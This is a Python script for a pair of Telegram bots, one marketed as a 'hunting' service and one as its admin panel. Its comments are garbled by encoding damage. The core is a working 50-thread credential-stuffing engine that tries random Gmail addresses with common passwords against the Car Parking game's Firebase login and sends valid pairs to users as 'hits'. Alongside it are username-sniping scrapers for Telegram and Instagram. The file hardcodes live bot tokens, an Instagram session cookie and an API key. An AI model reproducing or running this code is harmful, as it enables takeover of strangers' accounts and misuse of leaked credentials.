import telebot
import threading
import time
import random
import requests
import json
from datetime import datetime
from telebot import types
from telebot.apihelper import ApiTelegramException
from user_agent import generate_user_agent

# ==============================
# 1. Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ÙˆØ§Ù„ØªÙˆÙƒÙ†Ø§Øª
# ==============================
TOKEN_HUNT = '8501700333:AAHhi0bu4_Jwu_rw66Jy8OJ0e8i9AtvmAHE' # ØªÙˆÙƒÙ† Ø§Ù„ØµÙŠØ¯
TOKEN_ADMIN = '8506628064:AAFdS4tqtRiYEwz_oQfkDPUN7sfXlxdC6uc' # ØªÙˆÙƒÙ† Ø§Ù„Ø§Ø¯Ø§Ø±Ø©
MY_ID = 6532708587 # Ø§ÙŠØ¯ÙŠÙƒ

# ÙƒÙˆÙƒÙŠØ² Ø§Ù†Ø³ØªØ§ Ù„Ù„ÙØ­Øµ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ
INSTA_COOKIE = 'ig_did=4944AD57-ABED-42D8-B969-C273EDD18AF9; datr=4GJnaa_N6he2n99QKW4vFmQe; mid=aWdi4AABAAHFuGo_SK5Yv5duSypp; ps_l=1; ps_n=1; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; csrftoken=v8pvj6ZZCbkz9MDqJgtTl4JAHSfsihzU; ds_user_id=69852408405; dpr=1.6121296882629395; wd=809x1069; sessionid=69852408405%3AocDRBFPSkVj6HK%3A19%3AAYgzcuEvL53dK8aG6lgrysFfOlFlFCjhDsif1tPjmQ; rur="RVA\\05469852408405\\0541800448129:01fe6d56dbca1f53f7cd5266f12659b4d3829fd803edbd2146beca8e986f2704f09c08f1"'

THREADS_COUNT = 50 # Ø¹Ø¯Ø¯ Ø§Ù„Ø®ÙŠÙˆØ· (Ø³Ø±ÙŠØ¹)

bot_hunt = telebot.TeleBot(TOKEN_HUNT)
bot_admin = telebot.TeleBot(TOKEN_ADMIN)

# ==============================
# 2. Ù†Ø¸Ø§Ù… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¢Ù…Ù† (Ø­Ù„ Ù…Ø´ÙƒÙ„Ø© 429)
# ==============================
def safe_send_message(bot, chat_id, text, reply_markup=None):
    """Ø¯Ø§Ù„Ø© ØªØ±Ø³Ù„ Ø±Ø³Ø§Ù„Ø© ÙˆØªÙ†ØªØ¸Ø± Ø§Ø°Ø§ ÙƒØ§Ù† Ø§ÙƒÙˆ Ø­Ø¸Ø± Ù…Ø¤Ù‚Øª"""
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup)
    except ApiTelegramException as e:
        if e.error_code == 429:
            retry_after = int(e.result_json['parameters']['retry_after'])
            print(f"âš ï¸ Ø­Ø¸Ø± Ù…Ø¤Ù‚Øª Ù…Ù† ØªÙ„ÙŠØ¬Ø±Ø§Ù… (429). Ø§Ù†ØªØ¸Ø§Ø± {retry_after} Ø«Ø§Ù†ÙŠØ©...")
            time.sleep(retry_after)
            return safe_send_message(bot, chat_id, text, reply_markup)
        else:
            print(f"Error: {e}")

def safe_edit_message(bot, chat_id, message_id, text):
    """Ø¯Ø§Ù„Ø© ØªØ¹Ø¯Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© ÙˆØªÙ†ØªØ¸Ø± Ø§Ø°Ø§ ÙƒØ§Ù† Ø§ÙƒÙˆ Ø­Ø¸Ø± Ù…Ø¤Ù‚Øª"""
    try:
        bot.edit_message_text(text=text, chat_id=chat_id, message_id=message_id)
    except ApiTelegramException as e:
        if e.error_code == 429:
            # Ø§Ø°Ø§ Ø§ÙƒÙˆ Ø­Ø¸Ø±ØŒ Ù†ØºÙ„Ø³ Ø¹Ù„Ù‰ Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ù‡Ø§ÙŠ Ø§Ù„Ù…Ø±Ø© Ø­ØªÙ‰ Ù„Ø§ ÙŠØªÙˆÙ‚Ù Ø§Ù„Ø¨ÙˆØª
            pass 
        except: pass

# ==============================
# 3. Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ§Ù„Ù†ØµÙˆØµ
# ==============================
database = {
    'users': set(),
    'banned': set(),
    'maintenance': {'tele': False, 'insta': False, 'cpm': False}
}

stats = {
    'tele': {'checked': 0, 'hits': 0},
    'insta': {'checked': 0, 'hits': 0},
    'cpm': {'checked': 0, 'hits': 0}
}
user_languages = {}

TEXTS = {
    'ar': {
        'start': f"ğŸ‘‹ Ù…Ø±Ø­Ø¨Ø§Ù‹ Ø¨Ùƒ ÙÙŠ Ø¨ÙˆØª Ø§Ù„ØµÙŠØ¯ Ø§Ù„Ù…Ø·ÙˆØ±\nğŸ‘¨â€ğŸ’» Ø§Ù„Ù…Ø·ÙˆØ±: @XQQ2XğŸ‘‘\n\nğŸ‘‡ Ø§Ø®ØªØ± Ø§Ù„Ø®Ø¯Ù…Ø©:",
        'hunt_tele': "ğŸ”¹ ØµÙŠØ¯ ØªÙ„ÙŠØ¬Ø±Ø§Ù…",
        'hunt_insta': "ğŸ”¸ ØµÙŠØ¯ Ø§Ù†Ø³ØªÙ‚Ø±Ø§Ù…",
        'hunt_cpm': "ğŸ ØµÙŠØ¯ Car Parking",
        'choose_country': "ğŸ“ Ø§Ø®ØªØ± Ø§Ù„Ø¯ÙˆÙ„Ø©:",
        'running': "ğŸš€ Ø¨Ø¯Ø£ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ (50 Ø®ÙŠØ·)...",
        'maint': "âš ï¸ **Ø¹Ø°Ø±Ø§Ù‹ØŒ Ù‡Ø°Ø§ Ø§Ù„Ù‚Ø³Ù… ÙÙŠ Ø§Ù„ØµÙŠØ§Ù†Ø© Ø­Ø§Ù„ÙŠØ§Ù‹.**",
        'banned': "â›” **Ø£Ù†Øª Ù…Ø­Ø¸ÙˆØ± Ù…Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨ÙˆØª!**",
        'hit': "âœ… **ØªÙ… Ø§Ù„ØµÙŠØ¯!**\n\n{}",
        'stats_msg': "ğŸ“Š **Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ù…Ø¨Ø§Ø´Ø±Ø© ({})**\nâ”â”â”â”â”â”â”â”â”â”â”â”\nğŸ” Ø§Ù„ÙØ­Øµ: {}\nâœ… Ø§Ù„Ù…ØªØ§Ø­: {}",
        'reply_btn': "â†©ï¸ Ø±Ø¯",
        'admin_msg': "ğŸ‘®â€â™‚ï¸ **Ø±Ø³Ø§Ù„Ø© Ù…Ù† Ø§Ù„Ø¥Ø¯Ø§Ø±Ø©:**\n\n{}",
        'user_banned_msg': "â›” **Ø¹Ø°Ø±Ø§Ù‹ØŒ ØªÙ… Ø­Ø¸Ø±Ùƒ Ù…Ù† Ù‚Ø¨Ù„ Ø§Ù„Ø¥Ø¯Ø§Ø±Ø©.**",
        'user_unbanned_msg': "âœ… **Ù…Ø¨Ø±ÙˆÙƒØŒ ØªÙ… ÙÙƒ Ø§Ù„Ø­Ø¸Ø± Ø¹Ù†Ùƒ! ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø¢Ù†.**"
    },
    'en': {
        'start': f"ğŸ‘‹ Welcome Hunter\nğŸ‘¨â€ğŸ’» Dev: @XQQ2XğŸ‘‘\n\nğŸ‘‡ Choose Service:",
        'hunt_tele': "ğŸ”¹ Telegram Hunt",
        'hunt_insta': "ğŸ”¸ Instagram Hunt",
        'hunt_cpm': "ğŸ Car Parking Hunt",
        'choose_country': "ğŸ“ Choose Country:",
        'running': "ğŸš€ Real hunting started (50 threads)...",
        'maint': "âš ï¸ **Service is under maintenance.**",
        'banned': "â›” **You are banned!**",
        'hit': "âœ… **HIT FOUND!**\n\n{}",
        'stats_msg': "ğŸ“Š **Live Stats ({})**\nâ”â”â”â”â”â”â”â”â”â”â”â”\nğŸ” Checked: {}\nâœ… Hits: {}",
        'reply_btn': "â†©ï¸ Reply",
        'admin_msg': "ğŸ‘®â€â™‚ï¸ **Admin Message:**\n\n{}",
        'user_banned_msg': "â›” **You have been banned by admin.**",
        'user_unbanned_msg': "âœ… **Congrats! You have been unbanned.**"
    },
    'ru': {
        'start': f"ğŸ‘‹ Ğ”Ğ¾Ğ±Ñ€Ğ¾ Ğ¿Ğ¾Ğ¶Ğ°Ğ»Ğ¾Ğ²Ğ°Ñ‚ÑŒ\nğŸ‘¨â€ğŸ’» Dev: @XQQ2XğŸ‘‘\n\nğŸ‘‡ Ğ’Ñ‹Ğ±ĞµÑ€Ğ¸Ñ‚Ğµ:",
        'hunt_tele': "ğŸ”¹ Telegram",
        'hunt_insta': "ğŸ”¸ Instagram",
        'hunt_cpm': "ğŸ Car Parking",
        'choose_country': "ğŸ“ Ğ’Ñ‹Ğ±ĞµÑ€Ğ¸Ñ‚Ğµ:",
        'running': "ğŸš€ Ğ—Ğ°Ğ¿ÑƒÑĞº (50 Ğ¿Ğ¾Ñ‚Ğ¾ĞºĞ¾Ğ²)...",
        'maint': "âš ï¸ **Ğ¢ĞµÑ…Ğ½Ğ¸Ñ‡ĞµÑĞºĞ¾Ğµ Ğ¾Ğ±ÑĞ»ÑƒĞ¶Ğ¸Ğ²Ğ°Ğ½Ğ¸Ğµ.**",
        'banned': "â›” **Ğ’Ñ‹ Ğ·Ğ°Ğ±Ğ°Ğ½ĞµĞ½Ñ‹!**",
        'hit': "âœ… **Ğ£Ğ¡ĞŸĞ•Ğ¨ĞĞ!**\n\n{}",
        'stats_msg': "ğŸ“Š **Ğ¡Ñ‚Ğ°Ñ‚Ğ¸ÑÑ‚Ğ¸ĞºĞ° ({})**\nâ”â”â”â”â”â”â”â”â”â”â”â”\nğŸ” ĞŸÑ€Ğ¾Ğ²ĞµÑ€ĞµĞ½Ğ¾: {}\nâœ… ĞĞ°Ğ¹Ğ´ĞµĞ½Ğ¾: {}",
        'reply_btn': "â†©ï¸ ĞÑ‚Ğ²ĞµÑ‚Ğ¸Ñ‚ÑŒ",
        'admin_msg': "ğŸ‘®â€â™‚ï¸ **Ğ¡Ğ¾Ğ¾Ğ±Ñ‰ĞµĞ½Ğ¸Ğµ Ğ°Ğ´Ğ¼Ğ¸Ğ½Ğ°:**\n\n{}",
        'user_banned_msg': "â›” **Ğ’Ñ‹ Ğ·Ğ°Ğ±Ğ°Ğ½ĞµĞ½Ñ‹ Ğ°Ğ´Ğ¼Ğ¸Ğ½Ğ¸ÑÑ‚Ñ€Ğ°Ñ‚Ğ¾Ñ€Ğ¾Ğ¼.**",
        'user_unbanned_msg': "âœ… **ĞŸĞ¾Ğ·Ğ´Ñ€Ğ°Ğ²Ğ»ÑĞµĞ¼! Ğ’Ñ‹ Ñ€Ğ°Ğ·Ğ±Ğ°Ğ½ĞµĞ½Ñ‹.**"
    }
}

def get_text(chat_id, key):
    lang = user_languages.get(chat_id, 'ar') 
    return TEXTS[lang][key]

# ==============================
# 4. Ù…Ø­Ø±ÙƒØ§Øª Ø§Ù„ØµÙŠØ¯ (Engines)
# ==============================

def telegram_engine(chat_id):
    chars = 'QWERTYUIOPASD12345FGHJKLZXCVBNM67890'
    while True:
        try:
            stats['tele']['checked'] += 1
            u = "".join(random.choices(chars, k=5))
            url = f"https://t.me/{u}"
            req = requests.get(url, timeout=5)
            if 'If you have <strong>Telegram</strong>' in req.text:
                stats['tele']['hits'] += 1
                msg = get_text(chat_id, 'hit').format(f"ğŸ¦… User: @{u}")
                safe_send_message(bot_hunt, chat_id, msg)
            time.sleep(0.1)
        except: continue

def instagram_engine(chat_id):
    chars = 'abcdefghijklmnopqrstuvwxyz._1234567890'
    headers = {'User-Agent': generate_user_agent(), 'Cookie': INSTA_COOKIE, 'Accept-Language': 'en-US,en;q=0.9'}
    while True:
        try:
            u = "".join(random.choices(chars, k=random.randint(4,6)))
            r = requests.get(f"https://www.instagram.com/{u}/", headers=headers, timeout=5)
            
            if r.status_code == 404:
                stats['insta']['hits'] += 1
                msg = get_text(chat_id, 'hit').format(f"ğŸ“¸ User: {u}\n(Check availability)")
                safe_send_message(bot_hunt, chat_id, msg)
                stats['insta']['checked'] += 1
            elif r.status_code == 200:
                stats['insta']['checked'] += 1
            elif r.status_code == 429: # Ø­Ø¸Ø± Ù…Ø¤Ù‚Øª Ù…Ù† Ø§Ù†Ø³ØªØ§
                time.sleep(5)
            
            time.sleep(0.5) 
        except: 
            time.sleep(1)
            continue

def cpm_engine(chat_id, country):
    auth_url = 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
    pwds = ["123456", "12345678", "11223344"]
    names = ["ali", "ahmed", "saad", "omar", "fahad"]
    while True:
        try:
            stats['cpm']['checked'] += 1
            e = f"{random.choice(names)}{random.randint(10,9999)}@gmail.com"
            p = random.choice(pwds)
            res = requests.post(auth_url, json={'email': e, 'password': p, 'returnSecureToken': True}, timeout=5).json()
            if 'idToken' in res:
                stats['cpm']['hits'] += 1
                msg = get_text(chat_id, 'hit').format(f"ğŸ E: `{e}`\nP: `{p}`\nC: {country}")
                safe_send_message(bot_hunt, chat_id, msg)
            time.sleep(0.1)
        except: continue

def stats_updater(chat_id, msg_id, mode):
    while True:
        try:
            time.sleep(10) # âš ï¸ Ø²Ø¯Ù†Ø§ Ø§Ù„ÙˆÙ‚Øª Ù„Ù€ 10 Ø«ÙˆØ§Ù†ÙŠ Ù„ØªØ¬Ù†Ø¨ Ø­Ø¸Ø± ØªÙ„ÙŠØ¬Ø±Ø§Ù… 429
            c = stats[mode]['checked']
            h = stats[mode]['hits']
            txt = get_text(chat_id, 'stats_msg').format(mode, c, h)
            safe_edit_message(bot_hunt, chat_id, msg_id, txt)
        except: continue

# ==============================
# 5. Ø¨ÙˆØª Ø§Ù„Ø¥Ø¯Ø§Ø±Ø© (ADMIN)
# ==============================
@bot_admin.message_handler(commands=['start'])
def admin_dash(message):
    if message.chat.id != MY_ID: return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    st_tele = 'ğŸ”´ ØµÙŠØ§Ù†Ø©' if database['maintenance']['tele'] else 'ğŸŸ¢ Ø´ØºØ§Ù„'
    st_insta = 'ğŸ”´ ØµÙŠØ§Ù†Ø©' if database['maintenance']['insta'] else 'ğŸŸ¢ Ø´ØºØ§Ù„'
    st_cpm = 'ğŸ”´ ØµÙŠØ§Ù†Ø©' if database['maintenance']['cpm'] else 'ğŸŸ¢ Ø´ØºØ§Ù„'
    
    markup.add(
        types.InlineKeyboardButton(f"Tele: {st_tele}", callback_data='toggle_tele'),
        types.InlineKeyboardButton(f"Insta: {st_insta}", callback_data='toggle_insta'),
        types.InlineKeyboardButton(f"CPM: {st_cpm}", callback_data='toggle_cpm'),
        types.InlineKeyboardButton("ğŸ“ˆ ØªÙ‚Ø±ÙŠØ± Ø´Ø§Ù…Ù„", callback_data='report')
    )
    safe_send_message(bot_admin, message.chat.id, "ğŸ‘®â€â™‚ï¸ **Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…**", reply_markup=markup)

def process_reply_step(message, target_id):
    try:
        user_lang_msg = get_text(target_id, 'admin_msg').format(message.text)
        safe_send_message(bot_hunt, target_id, user_lang_msg)
        bot_admin.reply_to(message, "âœ… ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„.")
    except Exception as e:
        bot_admin.reply_to(message, f"âŒ ÙØ´Ù„: {e}")

@bot_admin.callback_query_handler(func=lambda call: True)
def admin_callbacks(call):
    if call.data.startswith('toggle_'):
        mode = call.data.split('_')[1]
        database['maintenance'][mode] = not database['maintenance'][mode]
        bot_admin.answer_callback_query(call.id, f"ØªÙ… ØªØºÙŠÙŠØ± {mode}")
        admin_dash(call.message)
    
    elif call.data == 'report':
        bot_admin.answer_callback_query(call.id)
        safe_send_message(bot_admin, call.message.chat.id, f"ğŸ‘¥ Users: {len(database['users'])}\nğŸš« Banned: {len(database['banned'])}")

    # === Ø§Ù„Ø­Ø¸Ø± ===
    elif call.data.startswith('ban_'):
        uid = int(call.data.split('_')[1])
        if uid not in database['banned']:
            database['banned'].add(uid)
            # Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…
            safe_send_message(bot_hunt, uid, get_text(uid, 'user_banned_msg'))
            
            bot_admin.answer_callback_query(call.id, "ØªÙ… Ø§Ù„Ø­Ø¸Ø±")
            # ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø­ØªÙ‰ ÙŠØ®ØªÙÙŠ Ø²Ø± Ø§Ù„Ø­Ø¸Ø± ÙˆÙŠØ·Ù„Ø¹ Ø²Ø± ÙÙƒ Ø§Ù„Ø­Ø¸Ø± (Ù…Ù…ÙƒÙ† ØªØ³ÙˆÙŠ ØªØ­Ø¯ÙŠØ« Ù„Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ø°Ø§ ØªØ­Ø¨)
            safe_send_message(bot_admin, call.message.chat.id, f"â›” ØªÙ… Ø­Ø¸Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {uid} Ø¨Ù†Ø¬Ø§Ø­.")
        else:
            bot_admin.answer_callback_query(call.id, "Ù‡Ùˆ Ù…Ø­Ø¸ÙˆØ± Ø£ØµÙ„Ø§Ù‹")

    # === ÙÙƒ Ø§Ù„Ø­Ø¸Ø± (Ø§Ù„Ù…ÙŠØ²Ø© Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©) ===
    elif call.data.startswith('unban_'):
        uid = int(call.data.split('_')[1])
        if uid in database['banned']:
            database['banned'].remove(uid)
            # Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…
            safe_send_message(bot_hunt, uid, get_text(uid, 'user_unbanned_msg'))
            
            bot_admin.answer_callback_query(call.id, "ØªÙ… ÙÙƒ Ø§Ù„Ø­Ø¸Ø±")
            safe_send_message(bot_admin, call.message.chat.id, f"âœ… ØªÙ… ÙÙƒ Ø­Ø¸Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {uid} Ø¨Ù†Ø¬Ø§Ø­.")
        else:
            bot_admin.answer_callback_query(call.id, "Ù‡Ùˆ ØºÙŠØ± Ù…Ø­Ø¸ÙˆØ±")

    elif call.data.startswith('reply_'):
        uid = int(call.data.split('_')[1])
        msg = safe_send_message(bot_admin, call.message.chat.id, f"âœï¸ Ø§ÙƒØªØ¨ Ø±Ø¯Ùƒ Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… `{uid}`:")
        bot_admin.register_next_step_handler(msg, process_reply_step, uid)

# ==============================
# 6. Ø¨ÙˆØª Ø§Ù„ØµÙŠØ¯ (HUNTER)
# ==============================
@bot_hunt.message_handler(commands=['start'])
def hunt_start(message):
    uid = message.chat.id
    database['users'].add(uid)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Ø§Ù„Ø¹Ø±Ø¨ÙŠØ© ğŸ‡®ğŸ‡¶", callback_data='lang_ar'),
               types.InlineKeyboardButton("English ğŸ‡ºğŸ‡¸", callback_data='lang_en'),
               types.InlineKeyboardButton("Ğ ÑƒÑÑĞºĞ¸Ğ¹ ğŸ‡·ğŸ‡º", callback_data='lang_ru'))
    safe_send_message(bot_hunt, uid, "Choose Language / Ø§Ø®ØªØ± Ø§Ù„Ù„ØºØ©:", reply_markup=markup)

@bot_hunt.message_handler(func=lambda m: True)
def forward_msg(message):
    if message.chat.id != MY_ID:
        uid = message.chat.id
        uname = f"@{message.from_user.username}" if message.from_user.username else "No User"
        txt = f"ğŸ“© **Ø±Ø³Ø§Ù„Ø©:**\nName: {message.from_user.first_name}\nUser: {uname}\nID: `{uid}`\n\n{message.text}"
        
        markup = types.InlineKeyboardMarkup()
        # Ø§Ù„Ø²Ø± Ø§Ù„Ø°ÙƒÙŠ: Ø§Ø°Ø§ Ù…Ø­Ø¸ÙˆØ± ÙŠØ·Ù„Ø¹ ÙÙƒ Ø­Ø¸Ø±ØŒ ÙˆØ§Ø°Ø§ Ù„Ø§ ÙŠØ·Ù„Ø¹ Ø­Ø¸Ø±
        if uid in database['banned']:
            ban_btn = types.InlineKeyboardButton("âœ… ÙÙƒ Ø­Ø¸Ø±", callback_data=f"unban_{uid}")
        else:
            ban_btn = types.InlineKeyboardButton("â›” Ø­Ø¸Ø±", callback_data=f"ban_{uid}")
            
        markup.add(types.InlineKeyboardButton("â†©ï¸ Ø±Ø¯", callback_data=f"reply_{uid}"), ban_btn)
        
        safe_send_message(bot_admin, MY_ID, txt, reply_markup=markup)

@bot_hunt.callback_query_handler(func=lambda call: True)
def hunt_callbacks(call):
    uid = call.message.chat.id
    
    if uid in database['banned']:
        bot_hunt.answer_callback_query(call.id, "â›” Banned!", show_alert=True)
        return

    if call.data.startswith('lang_'):
        user_languages[uid] = call.data.split('_')[1]
        try: bot_hunt.delete_message(uid, call.message.message_id)
        except: pass
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton(get_text(uid, 'hunt_tele'), callback_data='run_tele'),
            types.InlineKeyboardButton(get_text(uid, 'hunt_insta'), callback_data='run_insta'),
            types.InlineKeyboardButton(get_text(uid, 'hunt_cpm'), callback_data='choose_cpm')
        )
        sent = safe_send_message(bot_hunt, uid, get_text(uid, 'start'), reply_markup=markup)
        try: bot_hunt.pin_chat_message(uid, sent.message_id)
        except: pass
        return

    if call.data == 'choose_cpm':
        markup = types.InlineKeyboardMarkup(row_width=2)
        for c in ["Ø§Ù„Ø®Ù„ÙŠØ¬ ğŸ‡¸ğŸ‡¦", "ØªØ±ÙƒÙŠØ§ ğŸ‡¹ğŸ‡·", "Ø±ÙˆØ³ÙŠØ§ ğŸ‡·ğŸ‡º", "Ø§Ù„Ø¨Ø±Ø§Ø²ÙŠÙ„ ğŸ‡§ğŸ‡·"]:
            markup.add(types.InlineKeyboardButton(c, callback_data=f'cpm_{c}'))
        try: bot_hunt.edit_message_text(chat_id=uid, message_id=call.message.message_id, text=get_text(uid, 'choose_country'), reply_markup=markup)
        except: pass
        return

    mode = ''
    if call.data == 'run_tele': mode = 'tele'
    elif call.data == 'run_insta': mode = 'insta'
    elif call.data.startswith('cpm_'): mode = 'cpm'
    
    check_mode = 'cpm' if mode == 'cpm' else mode
    if check_mode in database['maintenance'] and database['maintenance'][check_mode] and uid != MY_ID:
        bot_hunt.answer_callback_query(call.id, get_text(uid, 'maint'), show_alert=True)
        return

    bot_hunt.answer_callback_query(call.id, "Started âœ…")
    safe_send_message(bot_hunt, uid, get_text(uid, 'running'))

    # Ø¥Ø´Ø¹Ø§Ø± Ù„Ù„Ù…Ø·ÙˆØ±
    try:
        now = datetime.now().strftime("%I:%M %p")
        uname = f"@{call.from_user.username}" if call.from_user.username else "No User"
        
        markup_control = types.InlineKeyboardMarkup()
        # Ø§Ù„Ø²Ø± Ø§Ù„Ø°ÙƒÙŠ Ù‡Ù†Ø§ Ø£ÙŠØ¶Ø§Ù‹
        if uid in database['banned']:
            ban_btn = types.InlineKeyboardButton("âœ… ÙÙƒ Ø­Ø¸Ø±", callback_data=f"unban_{uid}")
        else:
            ban_btn = types.InlineKeyboardButton("â›” Ø­Ø¸Ø±", callback_data=f"ban_{uid}")
            
        markup_control.add(types.InlineKeyboardButton("â†©ï¸ Ø±Ø¯", callback_data=f"reply_{uid}"), ban_btn)

        info = (f"ğŸ”” **Ø¨Ø¯Ø¡ ØªØ´ØºÙŠÙ„ Ø®Ø¯Ù…Ø©:**\n"
                f"ğŸ‘¤ Name: {call.from_user.first_name}\n"
                f"ğŸ”— User: {uname}\n"
                f"ğŸ†” ID: `{uid}`\n"
                f"âš™ï¸ Service: {mode}\n"
                f"ğŸ•’ Time: {now}")
        
        safe_send_message(bot_admin, MY_ID, info, reply_markup=markup_control)
    except: pass
    
    # ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ø¯Ø§Ù„Ø©
    if mode == 'tele':
        target = telegram_engine
        args = (uid,)
    elif mode == 'insta':
        target = instagram_engine
        args = (uid,)
    else: 
        target = cpm_engine
        args = (uid, call.data)

    # ØªØ´ØºÙŠÙ„ Ø§Ù„Ø®ÙŠÙˆØ·
    msg_stats = safe_send_message(bot_hunt, uid, "ğŸ“Š Loading...")
    threading.Thread(target=stats_updater, args=(uid, msg_stats.message_id, check_mode), daemon=True).start()
    
    for _ in range(THREADS_COUNT): 
        threading.Thread(target=target, args=args, daemon=True).start()

# ==============================
# 7. Ø§Ù„ØªØ´ØºÙŠÙ„
# ==============================
print("BOTS RUNNING SAFE... @XQQ2XğŸ‘‘")
t1 = threading.Thread(target=bot_hunt.infinity_polling)
t2 = threading.Thread(target=bot_admin.infinity_polling)
t1.start()
t2.start()
